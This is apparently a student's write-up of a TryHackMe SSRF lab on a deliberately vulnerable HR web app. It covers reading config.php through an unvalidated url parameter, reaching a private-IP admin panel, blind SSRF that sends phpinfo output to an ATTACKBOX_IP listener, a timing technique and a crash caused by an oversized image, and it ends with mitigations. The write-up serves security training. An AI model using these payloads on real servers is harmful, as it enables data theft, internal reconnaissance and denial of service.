# Server-Side Request Forgery (SSRF)

Tricking the **server** into making a request *for you* — against itself, against an internal system it can reach, or against a server you control — by manipulating a parameter that feeds into a request the application builds server-side.

> This is the **TryHackMe "SSRF" room** (Web Application Pentesting path, Advanced Server-Side Attacks module), using a vulnerable HRMS (Human Resource Management System) web app as the lab target. It covers basic SSRF (against the local server and against an internal server), blind SSRF (out-of-band and time-based), a denial-of-service example, and mitigation. Kept in this folder since it doubles as a standalone SSRF lab alongside [SSRF.md](./SSRF.md).
>
> 🔗 The earlier, Acme IT Support SSRF room sits right next to this file at [`SSRF.md`](./SSRF.md) — that one goes deeper on the four input vectors and filter-bypass families (deny-list IP encodings, allow-list string-matching flaws, open-redirect chaining). Read both, they reinforce each other with different labs. A copy of this note also lives at its real module placement, `Web-Application-Pentesting/Advanced-Server-Side-Attacks/SSRF.md` (same dual-copy pattern as [Advanced SQL Injection](../../Web-Application-Pentesting/Injection-Attacks/Advanced-SQL-Injection.md)).

---

**Table of contents**

- [In plain English](#in-plain-english)
- [Anatomy of an SSRF attack](#anatomy-of-an-ssrf-attack)
- [OWASP ranking and risk](#owasp-ranking-and-risk)
- [Basic SSRF — against the local server](#basic-ssrf--against-the-local-server)
- [Basic SSRF — accessing an internal server](#basic-ssrf--accessing-an-internal-server)
- [Blind SSRF](#blind-ssrf)
- [A classic example: crashing the server](#a-classic-example-crashing-the-server)
- [Mitigation](#mitigation)
- [Key takeaways](#key-takeaways)

---

## In plain English

Some feature on a page takes a URL, a path, or a hostname from you and the **server** goes and fetches it for its own purposes — showing a snippet of another page, loading an image, logging analytics data. SSRF is what happens when the thing you hand it points somewhere the developer never intended: another file on the same server, an internal admin panel on a private IP, or a server you run yourself.

| Concept | One-line hook |
| --- | --- |
| **Basic SSRF (local)** | The `url=` parameter loads *any* local file the app can read, not just the one page it was built for. |
| **Basic SSRF (internal)** | A dropdown/hidden value that normally points at one internal URL gets changed to point at another — reaching a private-IP admin panel you can't browse to directly. |
| **Blind SSRF (OOB)** | The app sends data to a URL you control — point it at your own listener and read what arrives. |
| **Blind SSRF (time-based)** | No visible output at all — you infer success from *how long* the request takes. |
| **SSRF → DoS** | Forcing the server to fetch something oversized or slow exhausts its own resources and crashes it. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Jargon, quickly:</strong> <strong>SSRF</strong> = Server-Side Request Forgery. <strong>Loopback / localhost</strong> = the server talking to itself (<code>127.0.0.1</code>). <strong>Internal/private IP</strong> = an address like <code>192.168.x.x</code> or <code>10.x.x.x</code> only reachable from inside the same network, not from the internet. <strong>Out-of-band (OOB)</strong> = confirming an attack through a side channel (a callback to your own server) instead of reading a direct response. <strong>Blind</strong> = the attack works but you don't get the result back in the page.
</div>

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet. The one idea to keep is <em>find a parameter the server uses to fetch something, then redirect it</em> — everything else (local file disclosure, internal-network pivoting, OOB confirmation, DoS) is a variation on what that redirected fetch can reach.
</div>

---

## Anatomy of an SSRF attack

Networked applications routinely make their own outbound requests — fetching software updates, pulling data from another service, loading a remote resource. SSRF shows up when **user-provided input shapes that request**: a parameter value gets dropped into a URL, path, or hostname the app then fetches. Manipulate that parameter and you redirect requests the *application* makes, not requests you make directly — which matters because the application's requests carry the application's trust and network position.

SSRF isn't limited to web apps specifically — any networked software that builds a request from input (web apps, APIs, server software generally) can carry it, across any language or platform.

---

## OWASP ranking and risk

SSRF sits in the OWASP Top 10 and ranks **7th in the OWASP API Security Top 10**. Headline stats (OWASP, 2021 dataset):

| Metric | Value | Meaning |
| --- | --- | --- |
| Max incidence rate | 2.72% | How often this vuln appears relative to others, at its most common. |
| Avg incidence rate | 2.72% | How common it is overall. |
| Avg weighted exploit | 8.28 | Average difficulty/effort to exploit (higher = easier/more severe weighting). |
| Avg weighted impact | 6.72 | Average severity once exploited. |
| Max coverage | 67.2% | How much of the dataset's systems were affected. |
| Total occurrences | 9,503 | Exploitation instances analysed. |
| Total CVEs | 385 | Including CVE-2021-21311, CVE-2018-11759, CVE-2017-9506. |

**Risk categories:**

| Risk | What it looks like |
| --- | --- |
| **Data exposure** | Tampered requests reach sensitive data hosted on the internal network. |
| **Reconnaissance** | Port-scanning the internal network via the vulnerable server, or redirecting to externally-hosted malicious scripts. |
| **Denial of service** | Internal networks are usually sized for low traffic; flooding them with illegitimate requests makes them unavailable to genuine ones. |

---

## Basic SSRF — against the local server

**Scenario:** the attacker targets the server *hosting the application itself*, typically by supplying `localhost`/a loopback address in a parameter the app uses to assemble a file/page request.

**The HRMS app:** visiting `http://hrms.thm` auto-redirects to `http://hrms.thm/?url=localhost/copyright`, which renders the site's copyright page. This is a feature the developer built to pull local pages dynamically — intended for internal use only.

The vulnerable handler:

```php
$uri = rtrim($_GET['url'], "/");
...
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
  echo "<pre>";
  echo htmlspecialchars(file_get_contents($path));
  echo "</pre>";
} else {
  // "<file> is not found"
}
```

`url` is never validated — whatever path it holds gets concatenated onto `ROOTPATH` and read straight off disk.

**Exploiting it:**

| Step | Request | Result |
| --- | --- | --- |
| Confirm the pattern | `?url=localhost/hello` | `hello.php` not found — proves the param is being used to locate a `.php` file by name. |
| Target something sensitive | `?url=localhost/config` | `config.php`'s contents render in the page footer — including the app's stored credentials/connection details. |

A small input-handling mistake (no filtering on which local file can be requested) hands over any file the `url=`/filename-building logic can reach. This basic SSRF pattern turns up across site types — e-commerce, banking, management systems — anywhere a feature fetches or includes a file based on user input.

---

## Basic SSRF — accessing an internal server

**Scenario:** front-end applications commonly talk to back-end services hosted on non-routable internal IPs (`192.168.x.x`, `10.x.x.x`) that aren't reachable from the public internet. If the front-end's input validation is weak, an attacker can steer *its* requests to reach other services on that same internal network — including ones with no internet-facing access controls at all.

**Working example (HRMS):**

1. Log in to the HRMS dashboard with the credentials recovered from `config.php` above. The dashboard lists employees by department, with a dropdown to view salary data.
2. The leaked config shows the admin panel lives at `http://192.168.2.10/admin.php` — a private IP, unreachable directly from outside that network (confirmed by trying it: connection fails).
3. Viewing the page source shows the salary dropdown is itself fetching from that same internal host — `http://192.168.2.10/employees.php` — and rendering the result in the page.
4. Via **Inspect Element**, change the dropdown's underlying value from `http://192.168.2.10/salary.php` to `http://192.168.2.10/admin.php`, then trigger the "Salary" option.
5. The app — still running on/with access to the internal network — fetches `admin.php` on the attacker's behalf and renders it. The admin panel, previously unreachable, is now visible through the vulnerable app.

The vulnerability isn't a new code path — it's the *same* internal-fetch feature, just pointed at a different internal URL than the one the UI intended.

---

## Blind SSRF

Blind SSRF: the request fires, but the attacker never sees the server's response or any direct feedback about what happened.

### Out-of-band (OOB)

Instead of reading a response directly, redirect the server's outbound request to an attacker-controlled listener and read what arrives there.

**HRMS example — the Profile page:**

```php
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
```

`profile.php` takes `url` straight from the query string, with **no validation**, and POSTs the server's own `phpinfo()` output to it — meant for an internal analytics/logging endpoint, but it'll happily POST to anywhere.

**Exploiting it:** stand up a listener (e.g. a small Python `HTTPServer` on port 8080 that logs POST bodies to a file), then visit:

```text
http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080
```

The logged POST body contains the server's `phpinfo()` dump — environment details, paths, versions — all useful recon for further attacks, obtained without the app ever showing it anything directly.

### Semi-blind SSRF (time-based)

When there's no OOB channel and no reflected output, **response timing** itself becomes the signal. Send requests targeting different internal hosts/ports and measure how long each takes:

- A request that **times out** or returns quickly with a connection-refused-style delay usually means nothing is listening there.
- A request that takes **noticeably longer** (the server actually connected and waited on a response) suggests something real exists at that address — inferring internal network structure purely from timing differences, without ever seeing a response body.

---

## A classic example: crashing the server

SSRF's impact isn't limited to information disclosure — forcing the server to fetch something expensive can exhaust its own resources. Real-world precedent includes WordPress and CairoSVG SSRF-driven DoS incidents.

**HRMS example — the Training tab:**

The Training page loads external content via `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`. Testing shows `id` isn't restricted to that one image — `?id=10.10.10.10` successfully loads unrelated content, confirming basic SSRF on this parameter too.

The relevant logic (visible by abusing the same `?url=localhost/url` local-file trick from the first section):

```php
if ($imageSize < 100) {
    // fetch, base64-encode, and render the image
    $base64Image = downloadAndEncodeImage($imageUrl);
    echo '<img src="' . htmlspecialchars($base64Image) . '" ...>';
} else {
    // Memory outage — server crashes
}
```

Any image **under 100 KB** gets fetched and rendered fine. Point `id` at an image **larger** than that threshold (`?id=192.168.2.10/bigImage.jpg`) and the server's own memory-handling path for the oversized fetch brings it down — a denial of service triggered entirely through a parameter meant to load a training banner.

**The takeaway:** SSRF's blast radius goes beyond reading internal data or reaching internal panels — it includes forcing the server to do something expensive enough, against a target of the attacker's choosing, to disrupt the service itself.

---

## Mitigation

- **Strict input validation** on every parameter that feeds a server-side request, especially URLs, hostnames, and paths.
- **Allow lists over deny lists** — permit only known-trusted URLs/domains rather than trying to block every bad one.
- **Network segmentation** so internal, sensitive resources aren't reachable from the application server in the first place.
- **Security headers** such as Content-Security-Policy to restrict what external resources the app is allowed to load.
- **Strong access controls on internal resources** — so even a successful SSRF request still needs proper authorisation to get anything useful back.
- **Logging and monitoring** of incoming requests, with alerts on unusual or unauthorised request patterns.

---

## Key takeaways

- **Basic SSRF (local):** an unvalidated `url=`-style parameter that builds a local file path can leak any file the app can read — including config files with credentials.
- **Basic SSRF (internal):** the same unvalidated-fetch pattern, redirected at a different internal IP/path, reaches services with no internet-facing protection — like an admin panel on a private IP.
- **Blind SSRF:** when there's no direct response, confirm and extract via an out-of-band listener (own server logging the callback) or via timing differences between reachable and unreachable targets.
- **SSRF → DoS:** forcing a fetch of an oversized or slow resource can exhaust server resources and crash the app, not just leak data.
- **Defence is validate + allow-list + segment + least-privilege + monitor** — the same shape as the mitigation advice in the [Acme IT Support SSRF room](./SSRF.md#mitigation), just without that room's deeper filter-bypass techniques (deny-list IP encodings, allow-list string tricks, open-redirect chaining) — read both for the fuller picture.

